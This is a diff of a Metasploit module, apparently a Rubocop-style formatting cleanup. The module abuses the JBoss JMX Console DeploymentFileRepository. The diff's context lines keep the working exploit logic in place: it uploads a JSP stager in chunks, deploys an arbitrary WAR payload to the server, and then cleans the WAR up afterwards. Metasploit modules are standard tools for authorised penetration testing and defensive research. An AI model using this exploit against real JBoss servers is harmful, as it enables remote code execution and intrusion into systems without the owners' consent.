@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,16 +7,15 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HTTP::JBoss
 
   def initialize
     super(
-      'Name'          => 'JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment',
-      'Description' => %q{
+      'Name' => 'JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment',
+      'Description' => %q(
         This module uses the DeploymentFileRepository class in the JBoss Application Server
         to deploy a JSP file which then deploys an arbitrary WAR file.
-      },
+      ),
       'Author'        =>
         [
           'us3r777 <us3r777[at]n0b0.so>'
@@ -41,13 +41,14 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('APPBASE', [ true,  'Application base name', 'payload']),
         OptPath.new('WARFILE',   [ false, 'The WAR file to deploy'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def deploy_action(app_base, war_data)
-    stager_base = Rex::Text.rand_text_alpha(8+rand(8))
-    stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
-    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
+    stager_base = Rex::Text.rand_text_alpha(8 + rand(8))
+    stager_jsp_name = Rex::Text.rand_text_alpha(8 + rand(8))
+    encoded_payload = Rex::Text.encode_base64(war_data).delete("\n")
     stager_contents = stager_jsp_with_payload(app_base, encoded_payload)
 
     if http_verb == 'POST'
@@ -55,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
       res = upload_file(stager_base, stager_jsp_name, stager_contents)
     else
       print_status("Deploying minimal stager to upload the payload...")
-      head_stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
+      head_stager_jsp_name = Rex::Text.rand_text_alpha(8 + rand(8))
       head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)
       head_stager_uri = "/" + stager_base + "/" + head_stager_jsp_name + ".jsp"
       res = upload_file(stager_base, head_stager_jsp_name, head_stager_contents)
@@ -65,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
       current_pos = 0
       while current_pos < stager_contents.length
         next_pos = current_pos + 5000 + rand(100)
-        vars_get = { 'arg0' => stager_contents[current_pos,next_pos] }
+        vars_get = { 'arg0' => stager_contents[current_pos, next_pos] }
         print_status("Uploading second stager (#{current_pos}/#{stager_contents.length})")
         res = deploy('uri'      => head_stager_uri,
                      'vars_get' => vars_get)
@@ -75,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
     # but the file still gets written.
-    unless res && ( res.code == 200 || res.code == 500)
+    unless res && (res.code == 200 || res.code == 500)
       fail_with(Failure::Unknown, "Failed to deploy")
     end
 
@@ -102,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
     delete_res.each do |res|
       if !res
         print_warning("Unable to remove WAR [No Response]")
-      elsif (res.code < 200 || res.code >= 300)
+      elsif res.code < 200 || res.code >= 300
         print_warning("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
       end
     end
